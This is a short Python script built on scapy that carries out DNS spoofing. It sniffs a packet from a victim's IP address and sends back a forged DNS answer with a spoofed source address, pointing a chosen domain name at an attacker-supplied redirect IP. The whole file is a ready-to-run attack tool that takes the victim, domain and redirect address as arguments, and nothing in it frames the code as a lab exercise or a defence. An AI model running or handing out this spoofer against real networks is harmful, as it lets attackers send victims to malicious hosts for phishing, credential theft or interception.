import sys
from scapy.all import *

def dns_response(interface, ip_victim, domain_name, ip_redirect):

	def pkt_handler(pkt):
		ip = IP(src=pkt[IP].dst, dst=ip_victim)
		dns = DNS(id=pkt[DNS].id, qd=DNSQR(qname=domain_name), \
			an=DNSRR(rrname=domain_name, rdata=ip_redirect))
		pkt = ip/ UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)/ dns
		send(pkt, iface=interface, verbose=0)

	return pkt_handler

if __name__ == "__main__":
	# Store arguments in variables.
	interface = str(sys.argv[1])
	ip_victim = str(sys.argv[2])
	domain_name = str(sys.argv[3])
	ip_redirect = str(sys.argv[4])

	# BFP filter for sniffing the packet.
	BFP_filter = "src {}".format(ip_victim)
	sniff(iface=interface, filter=BFP_filter, \
		prn=dns_response(interface, ip_victim, domain_name, ip_redirect), count=1)

